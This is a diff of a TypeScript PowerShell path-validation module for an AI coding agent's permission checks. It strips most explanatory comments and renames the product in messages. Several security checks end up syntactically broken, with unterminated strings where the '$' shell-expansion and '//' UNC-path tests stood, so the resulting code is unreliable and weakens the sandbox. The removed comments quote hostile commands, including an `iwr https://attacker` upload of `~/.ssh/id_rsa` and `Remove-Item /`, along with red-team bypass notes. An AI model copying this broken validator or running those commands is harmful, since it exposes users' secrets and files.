@@ -52,31 +52,6 @@ type ResolvedPathCheckResult = PathCheckResult & {
   resolvedPath: string
 }
 
-/**
- * Per-cmdlet parameter configuration.
- *
- * Each entry declares:
- *   - operationType: whether this cmdlet reads or writes to the filesystem
- *   - pathParams: parameters that accept file paths (validated against allowed directories)
- *   - knownSwitches: switch parameters (take NO value) — next arg is NOT consumed
- *   - knownValueParams: value-taking parameters that are NOT paths — next arg IS consumed
- *     but NOT validated as a path (e.g., -Encoding UTF8, -Filter *.txt)
- *
- * SECURITY MODEL: Any -Param NOT in one of these three sets forces
- * hasUnvalidatablePathArg → ask. This ends the KNOWN_SWITCH_PARAMS whack-a-mole
- * where every missing switch caused the unknown-param heuristic to swallow the
- * next arg (potentially the positional path). Now, Tier 2 cmdlets only auto-allow
- * with invocations we fully understand.
- *
- * Sources:
- *   - (Get-Command <cmdlet>).Parameters on Windows PowerShell 5.1
- *   - PS 6+ additions from official docs (e.g., -AsByteStream, -NoEmphasis)
- *
- * NOTE: Common parameters (-Verbose, -ErrorAction, etc.) are NOT listed here;
- * they are merged in from COMMON_SWITCHES / COMMON_VALUE_PARAMS at lookup time.
- *
- * Parameter names are lowercase with leading dash to match runtime comparison.
- */
 type CmdletPathConfig = {
   operationType: FileOperationType
   
@@ -97,10 +72,10 @@ type CmdletPathConfig = {
 }
 
 const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
-  // ─── Write/create operations ──────────────────────────────────────────────
+  
   'set-content': {
     operationType: 'write',
-    // -PSPath and -LP are runtime aliases for -LiteralPath on all provider
+    
     
     
     pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
@@ -111,7 +86,7 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
       '-confirm',
       '-usetransaction',
       '-nonewline',
-      '-asbytestream', // PS 6+
+      '-asbytestream', 
     ],
     knownValueParams: [
       '-value',
@@ -133,7 +108,7 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
       '-confirm',
       '-usetransaction',
       '-nonewline',
-      '-asbytestream', // PS 6+
+      '-asbytestream', 
     ],
     knownValueParams: [
       '-value',
@@ -175,16 +150,16 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
       '-stream',
     ],
   },
-  // Out-File/Tee-Object/Export-Csv/Export-Clixml were absent, so path-level
+  
   
   
   
   'out-file': {
     operationType: 'write',
-    // Out-File uses -FilePath (position 0). -Path is PowerShell's documented
-    // ALIAS for -FilePath — must be in pathParams or `Out-File -Path:./x`
-    // (colon syntax, one token) falls to unknown-param → value trapped →
-    // paths=[] → Edit deny never consulted → ask (fail-safe but deny downgrade).
+    
+    
+    
+    
     pathParams: ['-filepath', '-path', '-literalpath', '-pspath', '-lp'],
     knownSwitches: [
       '-append',
@@ -198,7 +173,7 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
   },
   'tee-object': {
     operationType: 'write',
-    // Tee-Object uses -FilePath (position 0, alias: -Path). -Variable NOT a path.
+    
     pathParams: ['-filepath', '-path', '-literalpath', '-pspath', '-lp'],
     knownSwitches: ['-append'],
     knownValueParams: ['-inputobject', '-variable', '-encoding'],
@@ -231,31 +206,31 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
     knownSwitches: ['-force', '-noclobber', '-whatif', '-confirm'],
     knownValueParams: ['-inputobject', '-depth', '-encoding'],
   },
-  // New-Item/Copy-Item/Move-Item were missing: `mkdir /etc/cron.d/evil` →
-  // resolveToCanonical('mkdir') = 'new-item' via COMMON_ALIASES → not in
-  // config → early return {paths:[], 'read'} → Edit deny never consulted.
-  //
-  // Copy-Item/Move-Item have DUAL path params (-Path source, -Destination
-  // dest). operationType:'write' is imperfect — source is semantically a read
-  // — but it means BOTH paths get Edit-deny validation, which is strictly
-  // safer than extracting neither. A per-param operationType would be ideal
-  // but that's a bigger schema change; blunt 'write' closes the gap now.
+  
+  
+  
+  
+  
+  
+  
+  
+  
   'new-item': {
     operationType: 'write',
-    // -Path is position 0. -Name (position 1) is resolved by PowerShell
     
-    // item in Name"), including `..` traversal. We resolve against CWD
-    // (validatePath L930), not -Path — so `New-Item -Path /allowed
-    // -Name ../secret/evil` creates /allowed/../secret/evil = /secret/evil,
-    // but we resolve cwd/../secret/evil which lands ELSEWHERE and can miss
-    // the deny rule. This is a deny→ask downgrade, not fail-safe.
-    //
-    // -name is in leafOnlyPathParams: simple leaf filenames (`foo.txt`) are
-    // extracted (resolves to cwd/foo.txt — slightly wrong, but -Path
-    // extraction covers the directory, and a leaf can't traverse);
-    // any value with `/`, `\`, `.`, `..` flags hasUnvalidatablePathArg →
-    // ask. Joining -Name against -Path would be correct but needs
-    // cross-parameter tracking — out of scope here.
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
     leafOnlyPathParams: ['-name'],
     knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
@@ -263,8 +238,8 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
   },
   'copy-item': {
     operationType: 'write',
-    // -Path (position 0) is source, -Destination (position 1) is dest.
-    // Both extracted; both validated as write.
+    
+    
     pathParams: ['-path', '-literalpath', '-pspath', '-lp', '-destination'],
     knownSwitches: [
       '-container',
@@ -296,17 +271,17 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
     ],
     knownValueParams: ['-filter', '-include', '-exclude', '-credential'],
   },
-  // rename-item/set-item: same class — ren/rni/si in COMMON_ALIASES, neither
-  // was in config. `ren /etc/passwd passwd.bak` → resolves to rename-item
-  // → not in config → {paths:[], 'read'} → Edit deny bypassed. This closes
-  // the COMMON_ALIASES→CMDLET_PATH_CONFIG coverage audit: every
-  // write-cmdlet alias now resolves to a config entry.
+  
+  
+  
+  
+  
   'rename-item': {
     operationType: 'write',
-    // -Path position 0, -NewName position 1. -NewName is leaf-only (docs:
-    // "You cannot specify a new drive or a different path") and Rename-Item
-    // explicitly rejects `..` in it — so knownValueParams is correct here,
-    // unlike New-Item -Name which accepts traversal.
+    
+    
+    
+    
     pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
     knownSwitches: [
       '-force',
@@ -325,12 +300,12 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
   },
   'set-item': {
     operationType: 'write',
-    // FileSystem provider throws NotSupportedException for Set-Item content,
-    // so the practical write surface is registry/env/function/alias providers.
-    // Provider-qualified paths (HKLM:\\, Env:\\) are independently caught at
-    // step 3.5 in powershellPermissions.ts, but classifying set-item as write
-    // here is defense-in-depth — powershellSecurity.ts:379 already lists it
-    // in ENV_WRITE_CMDLETS; this makes pathValidation consistent.
+    
+    
+    
+    
+    
+    
     pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
     knownSwitches: [
       '-force',
@@ -347,7 +322,7 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
       '-exclude',
     ],
   },
-  // ─── Read operations ──────────────────────────────────────────────────────
+  
   'get-content': {
     operationType: 'read',
     pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
@@ -356,15 +331,15 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
       '-usetransaction',
       '-wait',
       '-raw',
-      '-asbytestream', // PS 6+
+      '-asbytestream', 
     ],
     knownValueParams: [
       '-readcount',
       '-totalcount',
       '-tail',
-      '-first', // alias for -TotalCount
-      '-head', // alias for -TotalCount
-      '-last', // alias for -Tail
+      '-first', 
+      '-head', 
+      '-last', 
       '-filter',
       '-include',
       '-exclude',
@@ -453,8 +428,8 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
     knownValueParams: [
       '-inputobject',
       '-encoding',
-      '-count', // PS 6+
-      '-offset', // PS 6+
+      '-count', 
+      '-offset', 
     ],
   },
   'test-path': {
@@ -493,8 +468,8 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
       '-list',
       '-notmatch',
       '-allmatches',
-      '-noemphasis', // PS 7+
-      '-raw', // PS 7+
+      '-noemphasis', 
+      '-raw', 
     ],
     knownValueParams: [
       '-inputobject',
@@ -503,7 +478,7 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
       '-exclude',
       '-encoding',
       '-context',
-      '-culture', // PS 7+
+      '-culture', 
     ],
   },
   'set-location': {
@@ -520,8 +495,8 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
   },
   'pop-location': {
     operationType: 'read',
-    // Pop-Location has no -Path/-LiteralPath (it pops from the stack),
-    // but we keep the entry so it passes through path validation gracefully.
+    
+    
     pathParams: [],
     knownSwitches: ['-passthru', '-usetransaction'],
     knownValueParams: ['-stackname'],
@@ -534,7 +509,7 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
   },
   'get-winevent': {
     operationType: 'read',
-    // Get-WinEvent only has -Path, no -LiteralPath
+    
     pathParams: ['-path'],
     knownSwitches: ['-force', '-oldest'],
     knownValueParams: [
@@ -550,20 +525,20 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
       '-filterhashtable',
     ],
   },
-  // Write-path cmdlets with output parameters. Without these entries,
-  // -OutFile / -DestinationPath would write to arbitrary paths unvalidated.
+  
+  
   'invoke-webrequest': {
     operationType: 'write',
-    // -OutFile is the write target; -InFile is a read source (uploads a local
-    // file). Both are in pathParams so Edit deny rules are consulted (this
-    // config is operationType:write → permissionType:edit). A user with
-    // Edit(~/.ssh/**) deny blocks `iwr https://attacker -Method POST
-    // -InFile ~/.ssh/id_rsa` exfil. Read-only deny rules are not consulted
-    // for write-type cmdlets — that's a known limitation of the
-    // operationType→permissionType mapping.
+    
+    
+    
+    
+    
+    
+    
     pathParams: ['-outfile', '-infile'],
-    positionalSkip: 1, // positional-0 is -Uri (URL), not a filesystem path
-    optionalWrite: true, // only writes with -OutFile; bare iwr is pipeline-only
+    positionalSkip: 1, 
+    optionalWrite: true, 
     knownSwitches: [
       '-allowinsecureredirect',
       '-allowunencryptedauthentication',
@@ -605,11 +580,11 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
   },
   'invoke-restmethod': {
     operationType: 'write',
-    // -OutFile is the write target; -InFile is a read source (uploads a local
-    // file). Both must be in pathParams so deny rules are consulted.
+    
+    
     pathParams: ['-outfile', '-infile'],
-    positionalSkip: 1, // positional-0 is -Uri (URL), not a filesystem path
-    optionalWrite: true, // only writes with -OutFile; bare irm is pipeline-only
+    positionalSkip: 1, 
+    optionalWrite: true, 
     knownSwitches: [
       '-allowinsecureredirect',
       '-allowunencryptedauthentication',
@@ -665,11 +640,11 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
     knownSwitches: ['-force', '-update', '-passthru', '-whatif', '-confirm'],
     knownValueParams: ['-compressionlevel'],
   },
-  // *-ItemProperty cmdlets: primary use is the Registry provider (set/new/
-  // remove a registry VALUE under a key). Provider-qualified paths (HKLM:\,
-  // HKCU:\) are independently caught at step 3.5 in powershellPermissions.ts.
-  // Entries here are defense-in-depth for Edit-deny-rule consultation, mirroring
-  // set-item's rationale.
+  
+  
+  
+  
+  
   'set-itemproperty': {
     operationType: 'write',
     pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
@@ -739,11 +714,6 @@ const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
   },
 }
 
-/**
- * Checks if a lowercase parameter name (with leading dash) matches any entry
- * in the given param list, accounting for PowerShell's prefix-matching behavior
- * (e.g., -Lit matches -LiteralPath).
- */
 function matchesParam(paramLower: string, paramList: string[]): boolean {
   for (const p of paramList) {
     if (
@@ -756,15 +726,6 @@ function matchesParam(paramLower: string, paramList: string[]): boolean {
   return false
 }
 
-/**
- * Returns true if a colon-syntax value contains expression constructs that
- * mask the real runtime path (arrays, subexpressions, variables, backtick
- * escapes). The outer CommandParameterAst 'Parameter' element type hides
- * these from our AST walk, so we must detect them textually.
- *
- * Used in three branches of extractPathsFromCommand: pathParams,
- * leafOnlyPathParams, and the unknown-param defense-in-depth branch.
- */
 function hasComplexColonValue(rawValue: string): boolean {
   return (
     rawValue.includes(',') ||
@@ -773,7 +734,7 @@ function hasComplexColonValue(rawValue: string): boolean {
     rawValue.includes('`') ||
     rawValue.includes('@(') ||
     rawValue.startsWith('@{') ||
-    rawValue.includes('$')
+    rawValue.includes(')
   )
 }
 
@@ -789,9 +750,6 @@ function formatDirectoryList(directories: string[]): string {
   return `${firstDirs}, and ${dirCount - MAX_DIRS_TO_LIST} more`
 }
 
-/**
- * Expands tilde (~) at the start of a path to the user's home directory.
- */
 function expandTilde(filePath: string): string {
   if (
     filePath === '~' ||
@@ -803,15 +761,6 @@ function expandTilde(filePath: string): string {
   return filePath
 }
 
-/**
- * Checks the raw user-provided path (pre-realpath) for dangerous removal
- * targets. safeResolvePath/realpathSync canonicalizes in ways that defeat
- * isDangerousRemovalPath: on Windows '/' → 'C:\' (fails the === '/' check);
- * on macOS homedir() may be under /var which realpathSync rewrites to
- * /private/var (fails the === homedir() check). Checking the tilde-expanded,
- * backslash-normalized form catches the dangerous shapes (/, ~, /etc, /usr)
- * as the user typed them.
- */
 export function isDangerousRemovalRawPath(filePath: string): boolean {
   const expanded = expandTilde(filePath.replace(/^['"]|['"]$/g, '')).replace(
     /\\/g,
@@ -831,10 +780,6 @@ export function dangerousRemovalDeny(path: string): PermissionResult {
   }
 }
 
-/**
- * Checks if a resolved path is allowed for the given operation type.
- * Mirrors the logic in BashTool/pathValidation.ts isPathAllowed.
- */
 function isPathAllowed(
   resolvedPath: string,
   context: ToolPermissionContext,
@@ -843,7 +788,7 @@ function isPathAllowed(
 ): PathCheckResult {
   const permissionType = operationType === 'read' ? 'read' : 'edit'
 
-  // 1. Check deny rules first
+  
   const denyRule = matchingRuleForInput(
     resolvedPath,
     context,
@@ -857,10 +802,10 @@ function isPathAllowed(
     }
   }
 
-  // 2. For write/create operations, check internal editable paths (plan files, scratchpad, agent memory, job dirs)
-  // This MUST come before checkPathSafetyForAutoEdit since .claude is a dangerous directory
-  // and internal editable paths live under ~/.claude/ — matching the ordering in
-  // checkWritePermissionForTool (filesystem.ts step 1.5)
+  
+  
+  
+  
   if (operationType !== 'read') {
     const internalEditResult = checkEditableInternalPath(resolvedPath, {})
     if (internalEditResult.behavior === 'allow') {
@@ -871,7 +816,7 @@ function isPathAllowed(
     }
   }
 
-  // 2.5. For write/create operations, check safety validations
+  
   if (operationType !== 'read') {
     const safetyCheck = checkPathSafetyForAutoEdit(
       resolvedPath,
@@ -889,7 +834,7 @@ function isPathAllowed(
     }
   }
 
-  // 3. Check if path is in allowed working directory
+  
   const isInWorkingDir = pathInAllowedWorkingPath(
     resolvedPath,
     context,
@@ -901,7 +846,7 @@ function isPathAllowed(
     }
   }
 
-  // 3.5. For read operations, check internal readable paths
+  
   if (operationType === 'read') {
     const internalReadResult = checkReadableInternalPath(resolvedPath, {})
     if (internalReadResult.behavior === 'allow') {
@@ -912,11 +857,11 @@ function isPathAllowed(
     }
   }
 
-  // 3.7. For write/create operations to paths OUTSIDE the working directory,
-  // check the sandbox write allowlist. When the sandbox is enabled, users
-  // have explicitly configured writable directories (e.g. /tmp/claude/) —
-  // treat these as additional allowed write directories so redirects/Out-File/
-  // New-Item don't prompt unnecessarily. Paths IN the working directory are
+  
+  
+  
+  
+  
   
   
   if (
@@ -933,7 +878,7 @@ function isPathAllowed(
     }
   }
 
-  // 4. Check allow rules
+  
   const allowRule = matchingRuleForInput(
     resolvedPath,
     context,
@@ -947,22 +892,17 @@ function isPathAllowed(
     }
   }
 
-  // 5. Path is not allowed
+  
   return { allowed: false }
 }
 
-/**
- * Best-effort deny check for paths obscured by :: or backtick syntax.
- * ONLY checks deny rules — never auto-allows. If the stripped guess
- * doesn't match a deny rule, we fall through to ask as before.
- */
 function checkDenyRuleForGuessedPath(
   strippedPath: string,
   cwd: string,
   toolPermissionContext: ToolPermissionContext,
   operationType: FileOperationType,
 ): { resolvedPath: string; rule: PermissionRule } | null {
-  // Red-team P7: null bytes make expandPath throw. Pre-existing but
+  
   
   if (!strippedPath || strippedPath.includes('\0')) return null
   
@@ -982,16 +922,13 @@ function checkDenyRuleForGuessedPath(
   return denyRule ? { resolvedPath, rule: denyRule } : null
 }
 
-/**
- * Validates a file system path, handling tilde expansion.
- */
 function validatePath(
   filePath: string,
   cwd: string,
   toolPermissionContext: ToolPermissionContext,
   operationType: FileOperationType,
 ): ResolvedPathCheckResult {
-  // Remove surrounding quotes if present
+  
   const cleanPath = expandTilde(filePath.replace(/^['"]|['"]$/g, ''))
 
   
@@ -1002,8 +939,6 @@ function validatePath(
 
   
   // many positions (e.g., `/ === /) but defeats Node.js path checks like
-  // isAbsolute(). Redirection targets use raw .Extent.Text which preserves
-  // backtick escapes. Treat any path containing a backtick as unvalidatable.
   if (normalizedPath.includes('`')) {
     // Red-team P3: backtick is already resolved for StringConstant args
     // (parser uses .value); this guard primarily fires for redirection
@@ -1073,7 +1008,7 @@ function validatePath(
   // SECURITY: Block UNC paths — they can trigger network requests and
   
   if (
-    normalizedPath.startsWith('//') ||
+    normalizedPath.startsWith('
     /DavWWWRoot/i.test(normalizedPath) ||
     /@SSL@/i.test(normalizedPath)
   ) {
@@ -1088,8 +1023,8 @@ function validatePath(
     }
   }
 
-  // SECURITY: Reject paths containing shell expansion syntax
-  if (normalizedPath.includes('$') || normalizedPath.includes('%')) {
+  
+  if (normalizedPath.includes(') || normalizedPath.includes('%')) {
     return {
       allowed: false,
       resolvedPath: normalizedPath,
@@ -1100,12 +1035,12 @@ function validatePath(
     }
   }
 
-  // SECURITY: Block non-filesystem provider paths (env:, HKLM:, alias:, function:, etc.)
   
   
   
   
-  // - Windows: require 2+ letters before ':' so native drive letters (C:, D:)
+  
+  
   
   
   
@@ -1133,7 +1068,7 @@ function validatePath(
     }
   }
 
-  // SECURITY: Block glob patterns in write/create operations
+  
   if (GLOB_PATTERN_REGEX.test(normalizedPath)) {
     if (operationType === 'write' || operationType === 'create') {
       return {
@@ -1147,8 +1082,8 @@ function validatePath(
       }
     }
 
-    // For read operations with path traversal (e.g., /project/*/../../../etc/shadow),
-    // resolve the full path (including glob chars) and validate that resolved path.
+    
+    
     
     if (containsPathTraversal(normalizedPath)) {
       const absolutePath = isAbsolute(normalizedPath)
@@ -1171,11 +1106,11 @@ function validatePath(
       }
     }
 
-    // SECURITY (finding #15): Glob patterns for read operations cannot be
     
     
     
-    //   /project
+    
+    
 
 const SAFE_PATH_ELEMENT_TYPES = new Set<string>(['StringConstant', 'Parameter'])
 
@@ -1197,7 +1132,7 @@ function extractPathsFromCommand(cmd: ParsedCommandElement): {
     }
   }
 
-  // Build per-cmdlet known-param sets, merging in common parameters.
+  
   const switchParams = [...config.knownSwitches, ...COMMON_SWITCHES]
   const valueParams = [...config.knownValueParams, ...COMMON_VALUE_PARAMS]
 
@@ -1217,7 +1152,7 @@ function extractPathsFromCommand(cmd: ParsedCommandElement): {
     }
   }
 
-  // Extract named parameter values (e.g., -Path "C:\foo")
+  
   for (let i = 0; i < args.length; i++) {
     const arg = args[i]
     if (!arg) continue
@@ -1231,7 +1166,7 @@ function extractPathsFromCommand(cmd: ParsedCommandElement): {
     
     const argElementType = elementTypes ? elementTypes[i + 1] : undefined
     if (isPowerShellParameter(arg, argElementType)) {
-      // Handle colon syntax: -Path:C:\secret
+      
       
       const normalized = '-' + arg.slice(1)
       const colonIdx = normalized.indexOf(':', 1) 
@@ -1240,10 +1175,10 @@ function extractPathsFromCommand(cmd: ParsedCommandElement): {
       const paramLower = paramName.toLowerCase()
 
       if (matchesParam(paramLower, config.pathParams)) {
-        // Known path parameter — extract its value as a path.
+        
         let value: string | undefined
         if (colonIdx > 0) {
-          // Colon syntax: -Path:value — the whole thing is one element.
+          
           
           
           
@@ -1254,7 +1189,7 @@ function extractPathsFromCommand(cmd: ParsedCommandElement): {
             value = rawValue
           }
         } else {
-          // Standard syntax: -Path value
+          
           const nextVal = args[i + 1]
           const nextType = elementTypes ? elementTypes[i + 2] : undefined
           if (nextVal && !isPowerShellParameter(nextVal, nextType)) {
@@ -1270,10 +1205,10 @@ function extractPathsFromCommand(cmd: ParsedCommandElement): {
         config.leafOnlyPathParams &&
         matchesParam(paramLower, config.leafOnlyPathParams)
       ) {
-        // Leaf-only path parameter (e.g., New-Item -Name). PowerShell resolves
         
         
-        // traversal) resolve to the WRONG location and can miss deny rules
+        
+        
         
         
         let value: string | undefined
@@ -1300,29 +1235,29 @@ function extractPathsFromCommand(cmd: ParsedCommandElement): {
             value === '.' ||
             value === '..'
           ) {
-            // Non-leaf: separators or traversal. Can't resolve correctly
-            // without joining against -Path. Force ask.
+            
+            
             hasUnvalidatablePathArg = true
           } else {
-            // Simple leaf: extract. Resolves to cwd/leaf (slightly wrong —
-            // should be <-Path>/leaf) but -Path extraction covers the
-            // directory, and a leaf filename can't traverse out of anywhere.
+            
+            
+            
             paths.push(value)
           }
         }
       } else if (matchesParam(paramLower, switchParams)) {
-        // Known switch parameter — takes no value, do NOT consume next arg.
+        
         
         
       } else if (matchesParam(paramLower, valueParams)) {
-        // Known value-taking non-path parameter (e.g., -Encoding UTF8, -Filter *.txt).
+        
         
         
         
         
         
         if (colonIdx > 0) {
-          // Colon syntax: -Value:$env:FOO — the value is embedded in the token.
+          
           
           
           
@@ -1339,7 +1274,7 @@ function extractPathsFromCommand(cmd: ParsedCommandElement): {
           }
         }
       } else {
-        // Unknown parameter — we do not understand this invocation.
+        
         
         
         
@@ -1359,13 +1294,13 @@ function extractPathsFromCommand(cmd: ParsedCommandElement): {
             paths.push(rawValue)
           }
         }
-        // Continue the loop so we still extract any recognizable paths
+        
         
       }
       continue
     }
 
-    // Positional arguments: extract as paths (e.g., Get-Content file.txt)
+    
     
     
     if (positionalsSeen < positionalSkip) {
@@ -1385,24 +1320,6 @@ function extractPathsFromCommand(cmd: ParsedCommandElement): {
   }
 }
 
-/**
- * Checks path constraints for PowerShell commands.
- * Extracts file paths from the parsed AST and validates they are
- * within allowed directories.
- *
- * @param compoundCommandHasCd - Whether the full compound command contains a
- *   cwd-changing cmdlet (Set-Location/Push-Location/Pop-Location/New-PSDrive,
- *   excluding no-op Set-Location-to-CWD). When true, relative paths in ANY
- *   statement cannot be trusted — PowerShell executes statements sequentially
- *   and a cd in statement N changes the cwd for statement N+1, but this
- *   validator resolves all paths against the stale Node process cwd.
- *   BashTool parity (BashTool/pathValidation.ts:630-655).
- *
- * @returns
- * - 'ask' if any path command tries to access outside allowed directories
- * - 'deny' if a deny rule explicitly blocks the path
- * - 'passthrough' if no path commands were found or all paths are valid
- */
 export function checkPathConstraints(
   input: { command: string },
   parsed: ParsedPowerShellCommand,
@@ -1416,7 +1333,7 @@ export function checkPathConstraints(
     }
   }
 
-  // SECURITY: Two-pass approach — check ALL statements/paths so deny rules
+  
   
   
   
@@ -1459,15 +1376,6 @@ function checkPathConstraintsForStatement(
   
   
   
-  //   Set-Location ./.claude; Set-Content ./settings.json '...'
-  
-  
-  
-  
-  
-  
-  
-  //   - Push-Location/Pop-Location stack semantics
   
   
   
@@ -1479,7 +1387,16 @@ function checkPathConstraintsForStatement(
   
   
   
-  // not early return) so explicit deny rules on the stale-resolved path are
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
   
   if (compoundCommandHasCd) {
     firstAsk = {
@@ -1494,17 +1411,17 @@ function checkPathConstraintsForStatement(
     }
   }
 
-  // SECURITY: Track whether this statement contains a non-CommandAst pipeline
   
   
-  // `'/etc/passwd' | Remove-Item` — the string is piped to Remove-Item's -Path,
-  // but Remove-Item has no explicit args so extractPathsFromCommand returns
-  // zero paths and the command would passthrough. If ANY downstream cmdlet
-  // appears alongside an expression source, we force an ask — the piped
-  // path is unvalidatable regardless of operation type (reads leak data;
-  // writes destroy it).
+  
+  
+  
+  
+  
+  
+  
   let hasExpressionPipelineSource = false
-  // Track the non-CommandAst element's text for deny-rule guessing (finding #23).
+  
   
   
   
@@ -1525,15 +1442,15 @@ function checkPathConstraintsForStatement(
     
     
     
-    // but that was a bypass (review comment 2885739292): reads from
+    
     
     if (hasExpressionPipelineSource) {
       const canonical = resolveToCanonical(cmd.name)
       
       
-      // Remove-Item` should DENY (not ask) when Edit(.git/**) is configured.
-      // Strip surrounding quotes (string literals are quoted in .text) and
-      // feed through the same deny-guess helper used for ::/backtick paths.
+      
+      
+      
       if (pipelineSourceText !== undefined) {
         const stripped = pipelineSourceText.replace(/^['"]|['"]$/g, '')
         const denyHit = checkDenyRuleForGuessedPath(
@@ -1555,35 +1472,35 @@ function checkPathConstraintsForStatement(
         message: `${canonical} receives its path from a pipeline expression source that cannot be statically validated and requires manual approval`,
       }
       // Don't continue — fall through to path loop so deny rules on
-      // extracted paths are still checked.
+      
     }
 
-    // SECURITY: Array literals, subexpressions, and other complex
-    // argument types cannot be statically validated. An array literal
-    // like `-Path ./safe.txt, /etc/passwd` produces a single 'Other'
-    // element whose combined text may resolve within CWD while
-    // PowerShell actually writes to ALL paths in the array.
+    
+    
+    
+    
+    
     if (hasUnvalidatablePathArg) {
       const canonical = resolveToCanonical(cmd.name)
       firstAsk ??= {
         behavior: 'ask',
         message: `${canonical} uses a parameter or complex path expression (array literal, subexpression, unknown parameter, etc.) that cannot be statically validated and requires manual approval`,
       }
-      // Don't continue — fall through to path loop so deny rules on
-      // extracted paths are still checked.
+      
+      
     }
 
-    // SECURITY: Write cmdlet in CMDLET_PATH_CONFIG that extracted zero paths.
-    // Either (a) the cmdlet has no args at all (`Remove-Item` alone —
-    // PowerShell will error, but we shouldn't optimistically assume that), or
-    // (b) we failed to recognize the path among the args (shouldn't happen
-    // with the unknown-param fail-safe, but defense-in-depth). Conservative:
-    // write operation with no validated target → ask.
-    // Read cmdlets and pop-location (pathParams: []) are exempt.
-    // optionalWrite cmdlets (Invoke-WebRequest/Invoke-RestMethod without
-    // -OutFile) are ALSO exempt — they only write to disk when a pathParam is
-    // present; without one, output goes to the pipeline. The
-    // hasUnvalidatablePathArg check above already covers unknown-param cases.
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     if (
       operationType !== 'read' &&
       !optionalWrite &&
@@ -1598,18 +1515,18 @@ function checkPathConstraintsForStatement(
       continue
     }
 
-    // SECURITY: bash-parity hard-deny for removal cmdlets on
-    // system-critical paths. BashTool has isDangerousRemovalPath which
-    // hard-DENIES `rm /`, `rm ~`, `rm /etc`, etc. regardless of user config.
-    // Port: remove-item (and aliases rm/del/ri/rd/rmdir/erase → resolveToCanonical)
-    // on a dangerous path → deny (not ask). User cannot approve system32 deletion.
+    
+    
+    
+    
+    
     const isRemoval = resolveToCanonical(cmd.name) === 'remove-item'
 
     for (const filePath of paths) {
-      // Hard-deny removal of dangerous system paths (/, ~, /etc, etc.).
-      // Check the RAW path (pre-realpath) first: safeResolvePath can
-      // canonicalize '/' → 'C:\' (Windows) or '/var/...' → '/private/var/...'
-      // (macOS) which defeats isDangerousRemovalPath's string comparisons.
+      
+      
+      
+      
       if (isRemoval && isDangerousRemovalRawPath(filePath)) {
         return dangerousRemovalDeny(filePath)
       }
@@ -1621,8 +1538,8 @@ function checkPathConstraintsForStatement(
         operationType,
       )
 
-      // Also check the resolved path — catches symlinks that resolve to a
-      // protected location.
+      
+      
       if (isRemoval && isDangerousRemovalPath(resolvedPath)) {
         return dangerousRemovalDeny(resolvedPath)
       }
@@ -1638,7 +1555,7 @@ function checkPathConstraintsForStatement(
           decisionReason?.type === 'other' ||
           decisionReason?.type === 'safetyCheck'
             ? decisionReason.reason
-            : `${canonical} targeting '${resolvedPath}' was blocked. For security, Claude Code may only access files in the allowed working directories for this session: ${dirListStr}.`
+            : `${canonical} targeting '${resolvedPath}' was blocked. For security, Claude Code Next may only access files in the allowed working directories for this session: ${dirListStr}.`
 
         if (decisionReason?.type === 'rule') {
           return {
@@ -1686,7 +1603,7 @@ function checkPathConstraintsForStatement(
     }
   }
 
-  // Also check nested commands from control flow
+  
   if (statement.nestedCommands) {
     for (const cmd of statement.nestedCommands) {
       const { paths, operationType, hasUnvalidatablePathArg, optionalWrite } =
@@ -1698,11 +1615,11 @@ function checkPathConstraintsForStatement(
           behavior: 'ask',
           message: `${canonical} uses a parameter or complex path expression (array literal, subexpression, unknown parameter, etc.) that cannot be statically validated and requires manual approval`,
         }
-        // Don't continue — fall through to path loop for deny checks.
+        
       }
 
-      // SECURITY: Write cmdlet with zero extracted paths (mirrors main loop).
-      // optionalWrite cmdlets exempt — see main-loop comment.
+      
+      
       if (
         operationType !== 'read' &&
         !optionalWrite &&
@@ -1717,14 +1634,14 @@ function checkPathConstraintsForStatement(
         continue
       }
 
-      // SECURITY: bash-parity hard-deny for removal on system-critical
-      // paths — mirror the main-loop check above. Without this,
-      // `if ($true) { Remove-Item / }` routes through nestedCommands and
-      // downgrades deny→ask, letting the user approve root deletion.
+      
+      
+      
+      
       const isRemoval = resolveToCanonical(cmd.name) === 'remove-item'
 
       for (const filePath of paths) {
-        // Check the RAW path first (pre-realpath); see main-loop comment.
+        
         if (isRemoval && isDangerousRemovalRawPath(filePath)) {
           return dangerousRemovalDeny(filePath)
         }
@@ -1751,7 +1668,7 @@ function checkPathConstraintsForStatement(
             decisionReason?.type === 'other' ||
             decisionReason?.type === 'safetyCheck'
               ? decisionReason.reason
-              : `${canonical} targeting '${resolvedPath}' was blocked. For security, Claude Code may only access files in the allowed working directories for this session: ${dirListStr}.`
+              : `${canonical} targeting '${resolvedPath}' was blocked. For security, Claude Code Next may only access files in the allowed working directories for this session: ${dirListStr}.`
 
           if (decisionReason?.type === 'rule') {
             return {
